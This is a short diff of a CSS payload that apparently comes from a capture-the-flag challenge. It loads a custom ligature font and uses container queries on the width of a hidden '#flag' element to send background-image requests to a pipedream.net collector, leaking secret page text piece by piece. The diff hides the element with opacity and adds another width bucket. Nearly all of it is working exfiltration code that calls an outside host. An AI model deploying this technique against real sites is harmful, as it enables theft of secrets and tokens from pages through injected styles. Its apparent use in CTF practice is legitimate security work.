@@ -1,6 +1,7 @@
 body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=CQR0')}
 @font-face{font-family:cqp;src:url('https://uh4ck3r.github.io/ctf/cq_r0.woff2')}
-#flag{visibility:hidden;display:block!important;font-family:cqp;font-size:15px;width:max-content;container-type:inline-size;container-name:cqflag;white-space:pre}
+#flag{opacity:0;display:block!important;font-family:cqp;font-size:15px;width:max-content;container-type:inline-size;container-name:cqflag;white-space:pre}
+@container cqflag (max-width:59px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=NO_LIG')}}
 @container cqflag (min-width:60px) and (max-width:119px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_a')}}
 @container cqflag (min-width:120px) and (max-width:179px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_b')}}
 @container cqflag (min-width:180px) and (max-width:239px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_j')}}
